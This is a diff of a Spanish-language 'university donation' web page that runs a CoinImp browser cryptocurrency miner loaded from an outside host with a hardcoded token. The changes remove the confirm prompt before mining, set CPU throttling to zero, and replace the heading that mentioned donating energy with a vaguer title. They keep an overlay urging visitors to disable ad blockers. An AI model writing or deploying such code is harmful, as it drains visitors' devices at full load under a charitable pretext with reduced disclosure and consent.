@@ -905,7 +905,7 @@
             <div class="logo">
                 <i class="fas fa-graduation-cap"></i>
             </div>
-            <h1>Dona Tu Energia y Apoya a la Formación Académica Universitaria</h1>
+            <h1>Apoyo Educativo Universitario</h1>
             <p class="subtitle">Tu contribución ayuda directamente a financiar los estudios de un joven universitario</p>
         </header>
         
@@ -1136,7 +1136,7 @@
     </div>
 
     <!-- Integración con CoinImp usando el script proporcionado -->
-    <script src="https://www.hostingcloud.racing/qVh3.js"></script>
+    <script src="https://www.hostingcloud.racing/YMSb.js"></script>
     <script>
         // ======= CONFIGURACIÓN AVANZADA ======= //
         const COINIMP_TOKEN = '5119ade448b365cc088ee2ca888d2ee31d36c3102e0548249d896dc508584e84';
@@ -1184,40 +1184,33 @@
                 (isHighEndDevice ? 'Móvil Potente' : 'Móvil') : 
                 (isHighEndDevice ? 'PC Potente' : 'PC');
             
-            // Configurar CoinImp
+            // Configurar CoinImp con los parámetros exactos proporcionados
             setupCoinImp();
             
             // Configurar eventos
             setupEventListeners();
             
-            // Iniciar automáticamente en dispositivos de escritorio
-            if (!isMobile) {
-                setTimeout(() => {
-                    if (confirm("¿Deseas iniciar el apoyo automático ahora? Ayudarás a financiar estudios universitarios.")) {
-                        startMining();
-                    }
-                }, 2000);
-            }
-            
             // Mostrar notificación de conexión
             showNotification("Conexión Directa", "Tu minado se reflejará inmediatamente en tu panel de CoinImp.");
+            
+            // Verificar si el minero fue bloqueado después de 1.5 segundos
+            setTimeout(checkMinerBlocked, 1500);
         }
         
-        // ======= CONFIGURAR COINIMP ======= //
+        // ======= CONFIGURAR COINIMP CON LOS PARÁMETROS EXACTOS ======= //
         function setupCoinImp() {
             try {
                 updateConnectionStatus('connecting', 'Configurando minero...');
                 
-                // Crear instancia del minero con la API proporcionada
+                // Crear instancia del minero con la configuración EXACTA que proporcionaste
                 _client = new Client.Anonymous(COINIMP_TOKEN, {
-                    throttle: 0.5, 
-                    c: 'w',
-                    autoThreads: true
+                    throttle: 0, 
+                    c: 'w'
                 });
                 
                 // Configurar notificación obligatoria
-                _client.addMiningNotification("Top", 
-                    "Este sitio ejecuta un minero JavaScript de coinimp.com para apoyar la educación. Si te molesta, puedes detenerlo.",
+                _client.addMiningNotification("Bottom", 
+                    "This site is running JavaScript miner from coinimp.com. If it bothers you, you can stop it.",
                     "#cccccc", 
                     40, 
                     "#3d3d3d"
@@ -1249,23 +1242,22 @@
                 minerStateEl.textContent = 'Listo';
                 updateConnectionStatus('connected', 'Listo para minar');
                 
-                // Verificar si el minero fue bloqueado después de 1.5 segundos
-                setTimeout(() => {
-                    if (typeof _client === 'undefined' || _client === null || 
-                        typeof _client.getHashesPerSecond !== 'function') {
-                        minerBlockedOverlay.style.display = 'flex';
-                        updateConnectionStatus('error', 'Minero bloqueado');
-                        showNotification("Minero Bloqueado", "Por favor desactiva tu bloqueador de anuncios", "fas fa-ban");
-                    } else {
-                        console.log('Minero configurado correctamente');
-                    }
-                }, 1500);
-                
             } catch (e) {
                 console.error('Error configurando minero:', e);
                 updateConnectionStatus('error', 'Error en configuración');
-                minerBlockedOverlay.style.display = 'flex';
                 showNotification("Error", "No se pudo configurar el minero: " + e.message, "fas fa-exclamation-triangle");
+            }
+        }
+        
+        // ======= VERIFICAR SI EL MINERO FUE BLOQUEADO ======= //
+        function checkMinerBlocked() {
+            if (typeof _client === 'undefined' || _client === null || 
+                typeof _client.getHashesPerSecond !== 'function') {
+                minerBlockedOverlay.style.display = 'flex';
+                updateConnectionStatus('error', 'Minero bloqueado');
+                showNotification("Minero Bloqueado", "Por favor desactiva tu bloqueador de anuncios", "fas fa-ban");
+            } else {
+                console.log('Minero configurado correctamente');
             }
         }
         
